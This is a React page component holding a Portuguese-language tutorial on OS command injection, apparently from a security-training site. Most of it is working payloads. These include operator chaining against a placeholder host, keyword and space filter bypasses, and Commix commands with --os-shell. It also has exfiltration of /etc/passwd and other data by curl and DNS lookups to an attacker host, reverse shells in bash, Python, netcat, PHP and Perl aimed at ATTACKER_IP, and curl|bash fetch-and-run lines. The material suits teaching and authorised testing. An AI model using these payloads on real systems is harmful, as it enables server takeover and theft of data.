import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CommandInjection() {
  return (
    <PageContainer
      title="OS Command Injection"
      subtitle="Explore vulnerabilidades de injeção de comandos do sistema operacional. Guia completo com todos os operadores, detecção blind, bypass de filtros com exemplos reais, reverse shell, e automação com Commix."
      difficulty="intermediario"
      timeToRead="30 min"
    >
      <h2>O que é Command Injection?</h2>
      <p>
        <strong>OS Command Injection</strong> ocorre quando uma aplicação incorpora input do usuário
        diretamente em um comando do sistema operacional sem sanitização. Isso permite ao atacante
        "encadear" comandos adicionais e executar qualquer coisa no servidor — desde ler arquivos
        até obter shell remoto.
      </p>
      <p>
        Por exemplo: um site tem uma funcionalidade de "ping" que executa internamente
        <code>ping -c 3 [input_do_usuario]</code>. Se o usuário digitar <code>8.8.8.8; cat /etc/passwd</code>,
        o servidor executa: <code>ping -c 3 8.8.8.8; cat /etc/passwd</code> — e ambos os comandos são executados.
      </p>

      <AlertBox type="danger" title="Impacto: Execução Remota de Código (RCE)">
        Command injection é uma das vulnerabilidades mais graves. Permite ao atacante executar
        QUALQUER comando como o usuário do servidor (geralmente www-data, apache, ou nobody).
        De lá, pode escalar privilégios para root.
      </AlertBox>

      <h2>Operadores de Injeção — Referência Completa</h2>
      <CodeBlock
        title="Todos os operadores para encadear comandos e quando usar cada um"
        code={`# ═══════════════════════════════════════════════════
# OPERADOR: ; (ponto e vírgula)
# ═══════════════════════════════════════════════════
# Executa o segundo comando INDEPENDENTEMENTE do resultado
# do primeiro (funcione ou falhe).
#
# Exemplo: ping -c 3 8.8.8.8; whoami
# → Executa ping, DEPOIS executa whoami
# → Mesmo se o ping falhar, whoami executa
#
# Payload: ; whoami
# Ideal quando: você quer garantir execução do seu comando
# Funciona em: Bash, sh, zsh (Linux/Mac)
# NÃO funciona em: CMD do Windows (use & lá)

# ═══════════════════════════════════════════════════
# OPERADOR: | (pipe)
# ═══════════════════════════════════════════════════
# A saída do primeiro comando é enviada como ENTRADA
# do segundo comando. O segundo SEMPRE executa.
#
# Exemplo: ping -c 3 8.8.8.8 | whoami
# → whoami recebe a saída do ping (mas ignora)
# → A saída que APARECE é a do whoami
#
# Payload: | whoami
# Ideal quando: você quer ver APENAS a saída do seu comando
# (a saída do comando original é "consumida" pelo pipe)
# Funciona em: Bash, sh, CMD (universal!)

# ═══════════════════════════════════════════════════
# OPERADOR: || (OR lógico)
# ═══════════════════════════════════════════════════
# O segundo comando executa SOMENTE SE o primeiro FALHAR
# (exit code ≠ 0).
#
# Exemplo: ping -c 3 hostinvalido || whoami
# → ping falha (host não existe) → whoami executa
# → Se ping SUCEDER, whoami NÃO executa
#
# Payload: || whoami
# Ideal quando: o primeiro comando provavelmente vai falhar
# (ex: input inválido fornecido propositalmente)
# Dica: use "invalidinput || whoami" para garantir que falhe

# ═══════════════════════════════════════════════════
# OPERADOR: && (AND lógico)
# ═══════════════════════════════════════════════════
# O segundo comando executa SOMENTE SE o primeiro SUCEDER
# (exit code = 0).
#
# Exemplo: ping -c 3 8.8.8.8 && whoami
# → ping sucede → whoami executa
# → Se ping FALHAR, whoami NÃO executa
#
# Payload: && whoami
# Ideal quando: o primeiro comando vai funcionar normalmente
# e você quer "agregar" seu comando após o sucesso

# ═══════════════════════════════════════════════════
# OPERADOR: & (background / AND no CMD)
# ═══════════════════════════════════════════════════
# Linux: executa o primeiro em BACKGROUND e o segundo imediatamente
# Windows CMD: executa ambos (similar ao ; do Linux)
#
# Exemplo Linux: ping -c 3 8.8.8.8 & whoami
# → ping roda em background, whoami roda imediatamente
# → A saída pode ficar misturada
#
# Exemplo Windows: ping 8.8.8.8 & whoami
# → Ambos executam em sequência
#
# Payload: & whoami
# Ideal quando: testando em Windows CMD

# ═══════════════════════════════════════════════════
# OPERADOR: \`\` (backticks — substituição de comando)
# ═══════════════════════════════════════════════════
# O conteúdo entre backticks é EXECUTADO e seu OUTPUT
# é inserido no lugar dos backticks.
#
# Exemplo: ping -c 3 \`whoami\`
# → Primeiro executa whoami (retorna "www-data")
# → Depois executa: ping -c 3 www-data
# → O comando "whoami" foi executado!
#
# Payload: \`whoami\`
# Ideal quando: o input é inserido NO MEIO do comando
# Ex: O servidor faz "nslookup INPUT" → use \`whoami\`.INPUT
# O output do whoami pode ser extraído via DNS!

# ═══════════════════════════════════════════════════
# OPERADOR: $() (substituição de comando moderna)
# ═══════════════════════════════════════════════════
# Funciona igual aos backticks, mas é mais legível
# e permite ANINHAMENTO.
#
# Exemplo: ping -c 3 $(whoami)
# → Executa whoami, resultado vira argumento do ping
#
# Payload: $(whoami)
# Ideal quando: backticks não funcionam
# Vantagem: pode aninhar: $(cat $(find / -name "*.conf"))

# ═══════════════════════════════════════════════════
# OPERADOR: \\n (newline — %0a em URL encoding)
# ═══════════════════════════════════════════════════
# Quebra de linha separa comandos em muitos shells.
#
# Payload em URL: 8.8.8.8%0awhoami
# → Decodificado: 8.8.8.8[ENTER]whoami
# → Shell interpreta como dois comandos separados
#
# Ideal quando: ; e | estão filtrados
# Também tentar: %0d%0a (CRLF — carriage return + line feed)`}
      />

      <h2>Cenários de Exploração Reais</h2>
      <CodeBlock
        title="Exemplos práticos com output esperado"
        code={`# ═══════════════════════════════════════════════════
# CENÁRIO 1: Ferramenta de Ping na Web
# ═══════════════════════════════════════════════════
# Funcionalidade: "Digite um IP para testar conectividade"
# Backend (PHP): exec("ping -c 3 " . $_GET['host'])
# Backend (Python): os.system("ping -c 3 " + request.args['host'])

# URL original:
# http://alvo.com/ping?host=8.8.8.8

# Teste 1 — Semicolon
# http://alvo.com/ping?host=8.8.8.8;id
# Output esperado:
# PING 8.8.8.8 ...
# 64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=10.2 ms
# ...
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
#      ↑ ID do usuário do servidor! Injection funcionou!

# Teste 2 — Pipe (só mostra seu comando)
# http://alvo.com/ping?host=8.8.8.8|id
# Output esperado:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# (sem output do ping — pipe consumiu)

# Teste 3 — Ler /etc/passwd
# http://alvo.com/ping?host=8.8.8.8;cat+/etc/passwd
# (+  = espaço em URL encoding)
# Output: conteúdo do /etc/passwd

# ═══════════════════════════════════════════════════
# CENÁRIO 2: Lookup de DNS na Web
# ═══════════════════════════════════════════════════
# Backend: exec("nslookup " + domain)
# URL: http://alvo.com/dns?domain=example.com

# Payloads:
# domain=example.com;id
# domain=example.com|id
# domain=$(id)
# domain=example.com%0aid   (%0a = newline)

# ═══════════════════════════════════════════════════
# CENÁRIO 3: Conversor de Arquivos
# ═══════════════════════════════════════════════════
# Backend: system("convert " + filename + " output.png")
# Upload: arquivo com nome: ;id;.jpg
# Ou via parâmetro: filename=foto.jpg;id

# ═══════════════════════════════════════════════════
# CENÁRIO 4: Busca no Sistema
# ═══════════════════════════════════════════════════
# Backend: system("grep -r '" + query + "' /var/data/")
# Payload: ';id;'
# Resultado: grep -r '';id;'' /var/data/
# → erro do grep + execução do id`}
      />

      <h2>Blind Command Injection — Detalhado</h2>
      <CodeBlock
        title="Detectar e explorar injection sem ver output"
        code={`# ═══════════════════════════════════════════════════
# MÉTODO 1: TIME-BASED (medir tempo de resposta)
# ═══════════════════════════════════════════════════
# Use 'sleep' para criar delay mensurável:

# Payload: ; sleep 10
# Se a resposta demora 10 segundos a mais → VULNERÁVEL!

# Payloads de time-based:
; sleep 10                  # Linux — espera 10s
| sleep 10                  # Linux via pipe
& sleep 10                  # Linux background
; ping -c 10 127.0.0.1     # ~10s (1 ping/seg)
& timeout /t 10             # Windows — espera 10s

# Testando progressivamente:
; sleep 1    # demora 1s extra? → injection provável
; sleep 5    # demora 5s extra? → injection confirmada!
; sleep 10   # demora 10s extra? → certeza absoluta!

# ═══════════════════════════════════════════════════
# MÉTODO 2: DNS EXFILTRATION (extrair dados via DNS)
# ═══════════════════════════════════════════════════
# O servidor não mostra output, mas pode fazer requisições DNS.
# Insira o resultado do comando como subdomínio de um domínio
# que você controla!

# Preparação: usar Burp Collaborator ou interact.sh
# URL do Collaborator: xxxxx.burpcollaborator.net

# Payload para exfiltrar whoami:
; nslookup $(whoami).xxxxx.burpcollaborator.net
# O servidor faz lookup DNS para:
# www-data.xxxxx.burpcollaborator.net
# ↑ "www-data" aparece no Collaborator como subdomain!

# Exfiltrar /etc/hostname:
; nslookup $(cat /etc/hostname).xxxxx.burpcollaborator.net

# Exfiltrar dados maiores (base64 + curl):
; curl http://ATTACKER_IP:8080/$(cat /etc/passwd | base64 -w0)

# No atacante, escutar com:
nc -lvnp 8080
# Ou:
python3 -m http.server 8080
# O dado aparece na URL da requisição recebida

# ═══════════════════════════════════════════════════
# MÉTODO 3: ARQUIVO COMO INDICADOR
# ═══════════════════════════════════════════════════
# Criar um arquivo acessível via web:
; echo "PWNED" > /var/www/html/proof.txt
# Depois acessar: http://alvo.com/proof.txt
# Se mostrar "PWNED" → injection confirmada!

# Com dados sensíveis:
; cat /etc/passwd > /var/www/html/data.txt
# Acessar: http://alvo.com/data.txt

# ═══════════════════════════════════════════════════
# MÉTODO 4: PING OUT-OF-BAND
# ═══════════════════════════════════════════════════
# No atacante, monitorar ICMP:
sudo tcpdump icmp -i eth0

# Payload:
; ping -c 3 ATTACKER_IP
# Se receber 3 ICMP packets → injection confirmada!`}
      />

      <h2>Bypass de Filtros — Guia Completo</h2>
      <CodeBlock
        title="Contornar filtros de input e WAFs"
        code={`# ═══════════════════════════════════════════════════
# FILTRO: Espaço bloqueado (espaço é removido ou rejeitado)
# ═══════════════════════════════════════════════════

# Solução 1: $IFS (Internal Field Separator)
# $IFS é uma variável do Bash que contém espaço por padrão
cat\${IFS}/etc/passwd
# → Bash interpreta $IFS como espaço → cat /etc/passwd

# Solução 2: $IFS$9 (variante mais confiável)
cat\${IFS}\$9/etc/passwd

# Solução 3: Brace expansion {,}
{cat,/etc/passwd}
# → Bash expande para: cat /etc/passwd

# Solução 4: Tab (%09 em URL encoding)
cat%09/etc/passwd
# Tab funciona como separador de argumentos

# Solução 5: Redirecionamento de input
cat</etc/passwd
# < não precisa de espaço antes do argumento

# ═══════════════════════════════════════════════════
# FILTRO: Palavras-chave bloqueadas (cat, whoami, etc.)
# ═══════════════════════════════════════════════════

# Solução 1: Aspas simples entre letras
c'a't /etc/passwd    # Bash ignora aspas vazias: ca't → cat
w'h'o'a'm'i          # → whoami

# Solução 2: Aspas duplas entre letras
c"a"t /etc/passwd    # → cat /etc/passwd
w"h"o"a"m"i"         # → whoami

# Solução 3: Backslash antes de letras
c\\at /etc/passwd     # \\ antes de char normal é ignorado
wh\\oa\\mi             # → whoami

# Solução 4: Wildcards (*)
/bin/ca* /etc/passwd  # → /bin/cat /etc/passwd
# * expande para qualquer sufixo

# Solução 5: Wildcard (?)
/bin/c?t /etc/passwd  # ? = qualquer char único
# → /bin/cat /etc/passwd

# Solução 6: Variáveis parciais
a]c;cat /etc/passwd    # Se ; funciona, ignore a primeira parte

# Solução 7: Concatenação de variáveis
w=$'\\x77';h=$'\\x68';o=$'\\x6f';a=$'\\x61';m=$'\\x6d';i=$'\\x69';$w$h$o$a$m$i
# Constrói "whoami" char por char em hex

# Solução 8: Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# "Y2F0IC9ldGMvcGFzc3dk" = "cat /etc/passwd" em base64
# base64 -d decodifica, bash executa

# Solução 9: printf
$(printf '\\x63\\x61\\x74') /etc/passwd
# \\x63\\x61\\x74 = "cat" em hex

# Solução 10: Variáveis de ambiente
\${PATH:0:1}           # "/" (primeiro char de PATH)
\${HOME:0:1}           # "/" se HOME=/root
\${LS_COLORS:10:1}     # pode conter caracteres úteis

# ═══════════════════════════════════════════════════
# FILTRO: Barras (/ e \\) bloqueadas
# ═══════════════════════════════════════════════════
# Usando variável PATH para obter "/"
cat \${PATH%%u*}etc\${PATH%%u*}passwd
# PATH=/usr/bin → ${PATH%%u*} = "/" → cat /etc/passwd

# Usando $HOME
cat \${HOME:0:1}etc\${HOME:0:1}passwd

# ═══════════════════════════════════════════════════
# FILTRO: Comandos inteiros bloqueados por regex
# ═══════════════════════════════════════════════════
# Se o filtro bloqueia /whoami|cat|id|passwd/:
# Usar aliases ou comandos alternativos:
less /etc/passwd        # Em vez de cat
head /etc/passwd        # Primeiras 10 linhas
tail /etc/passwd        # Últimas 10 linhas
more /etc/passwd        # Paginado
tac /etc/passwd         # cat ao contrário
nl /etc/passwd          # Com números de linha
xxd /etc/passwd         # Hexdump
od /etc/passwd          # Octal dump
sort /etc/passwd        # Ordenado
uniq /etc/passwd        # Sem duplicatas
rev /etc/passwd | rev   # Reverso duplo = original`}
      />

      <h2>Commix — Ferramenta Automatizada</h2>
      <CodeBlock
        title="Automação completa de command injection com Commix"
        code={`# ═══════════════════════════════════════════════════
# INSTALAR COMMIX
# ═══════════════════════════════════════════════════
sudo apt install commix
# Ou: git clone https://github.com/commixproject/commix.git

# ═══════════════════════════════════════════════════
# USO BÁSICO
# ═══════════════════════════════════════════════════

# Scan de GET parameter:
commix -u "http://alvo.com/ping?host=8.8.8.8"
# commix testa TODOS os operadores (;, |, ||, &&, etc.)
# automaticamente e reporta quais funcionam.

# Scan de POST parameter:
commix -u "http://alvo.com/ping" --data="host=8.8.8.8"

# ═══════════════════════════════════════════════════
# FLAGS IMPORTANTES
# ═══════════════════════════════════════════════════

# -p PARAM — especificar qual parâmetro testar
commix -u "http://alvo.com/page?a=1&b=2&host=8.8.8.8" -p host
# Testa apenas "host", ignora "a" e "b"

# --cookie — incluir cookie de sessão
commix -u "http://alvo.com/ping?host=test" \\
  --cookie="PHPSESSID=abc123; role=user"

# --headers — headers customizados
commix -u "http://alvo.com/api/ping" \\
  --headers="Authorization: Bearer TOKEN123"

# --technique — escolher técnica de detecção
commix -u "http://alvo.com/ping?host=test" --technique=T
# Técnicas:
# C = Classic (baseada em output — ; | && etc.)
# E = Eval-based (funciones eval, system, etc.)
# T = Time-based (blind — usando sleep)
# F = File-based (escrever arquivo no servidor)
# Padrão: testa TODAS

# --os-shell — obter shell interativo
commix -u "http://alvo.com/ping?host=test" --os-shell
# Se injection funciona, abre shell interativo:
# os-shell> whoami
# www-data
# os-shell> cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# ...

# --os-cmd — executar comando único
commix -u "http://alvo.com/ping?host=test" --os-cmd="id"
# Executa "id" e mostra resultado

# ═══════════════════════════════════════════════════
# FLAGS AVANÇADAS
# ═══════════════════════════════════════════════════

# --level — agressividade (1-3, padrão 1)
commix -u "http://alvo.com/ping?host=test" --level=3
# Level 1: testes básicos
# Level 2: mais payloads, mais técnicas
# Level 3: máxima cobertura (mais lento)

# --tamper — ofuscação de payloads (bypass WAF)
commix -u "http://alvo.com/ping?host=test" \\
  --tamper=base64encode
# Tamper scripts disponíveis:
# base64encode    — codifica em base64
# hexencode       — codifica em hex
# singlequotes    — adiciona aspas simples
# doublequotes    — adiciona aspas duplas
# space2tab       — substitui espaço por tab

# --proxy — usar proxy (Burp)
commix -u "http://alvo.com/ping?host=test" \\
  --proxy="http://127.0.0.1:8080"

# --random-agent — User-Agent aleatório
commix -u "http://alvo.com/ping?host=test" --random-agent`}
      />

      <h2>Reverse Shell via Command Injection</h2>
      <CodeBlock
        title="Obter acesso shell completo após confirmar injection"
        code={`# ═══════════════════════════════════════════════════
# PREPARAÇÃO: Listener no atacante
# ═══════════════════════════════════════════════════
# Terminal do atacante:
nc -lvnp 4444
# -l = listen (escutar)
# -v = verbose (mostrar conexões)
# -n = no DNS lookup
# -p 4444 = porta para escutar

# ═══════════════════════════════════════════════════
# PAYLOADS DE REVERSE SHELL (inserir via injection)
# ═══════════════════════════════════════════════════

# Bash reverse shell (mais confiável em Linux):
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# bash -i         = bash interativo
# >& /dev/tcp/... = redirecionar stdout E stderr para TCP
# 0>&1             = redirecionar stdin do mesmo socket

# Python reverse shell:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
# Cria named pipe, conecta bash a ele, e envia via netcat

# PHP reverse shell:
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl reverse shell:
; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# ═══════════════════════════════════════════════════
# SE CARACTERES ESPECIAIS ESTÃO FILTRADOS
# ═══════════════════════════════════════════════════
# Hospedar script de reverse shell no atacante e usar curl/wget:

# No atacante, criar arquivo shell.sh:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
python3 -m http.server 8080

# Payload via injection:
; curl http://ATTACKER_IP:8080/shell.sh | bash
# Ou:
; wget -qO- http://ATTACKER_IP:8080/shell.sh | bash
# -q = quiet, O- = output para stdout`}
      />
    </PageContainer>
  );
}
